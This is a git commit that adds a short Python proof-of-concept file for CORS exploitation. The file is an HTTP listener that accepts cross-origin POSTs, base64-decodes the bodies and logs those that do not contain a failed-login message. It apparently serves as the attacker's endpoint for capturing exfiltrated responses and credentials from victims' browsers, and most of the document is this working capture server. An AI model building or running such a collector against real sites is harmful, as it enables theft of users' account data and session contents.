9805570db6a7128285f125cd1b16a38e6afc068f
babywyrm <55672787+babywyrm@users.noreply.github.com>
2023-04-23 09:43:24 -0700

    Create base_.py

---
+++ cors/poc/base_.py
@@ -0,0 +1,60 @@
+#!/usr/bin/python3
+
+############
+############
+
+from http.server import BaseHTTPRequestHandler, HTTPServer
+import logging
+import base64
+import urllib.parse
+
+class S(BaseHTTPRequestHandler):
+    def _set_response(self):
+        self.send_response(200)
+        self.send_header('Content-type', 'text/html')
+        self.send_header('Access-Control-Allow-Origin', '*')
+        self.end_headers()
+
+    def do_GET(self):
+        logging.info("GET request,\nPath: %s\nHeaders:\n%s\n", str(self.path), str(self.headers))
+        self._set_response()
+        self.wfile.write("GET request for {}".format(self.path).encode('utf-8'))
+
+    def do_POST(self):
+        content_length = int(self.headers['Content-Length']) # <--- Gets the size of data
+        post_data = self.rfile.read(content_length) # <--- Gets the data itself
+        r = urllib.parse.unquote(base64.b64decode(post_data.decode('utf-8')))
+        if 'Invalid email or password' not in r:
+            logging.info("POST request,\nPath: %s\nHeaders:\n%s\n\nBody:\n%s\n",
+                    str(self.path), str('self.headers'), r)
+        else:
+            logging.info("nothing")
+
+        self._set_response()
+        self.wfile.write("POST request for {}".format(self.path).encode('utf-8'))
+
+def run(server_class=HTTPServer, handler_class=S, port=8080):
+    logging.basicConfig(level=logging.INFO)
+    server_address = ('', port)
+    httpd = server_class(server_address, handler_class)
+    logging.info('Starting httpd...\n')
+    try:
+        httpd.serve_forever()
+    except KeyboardInterrupt:
+        pass
+    httpd.server_close()
+    logging.info('Stopping httpd...\n')
+
+if __name__ == '__main__':
+    from sys import argv
+
+    if len(argv) == 2:
+        run(port=int(argv[1]))
+    else:
+        run()
+        
+############
+############
+##
+##
+        
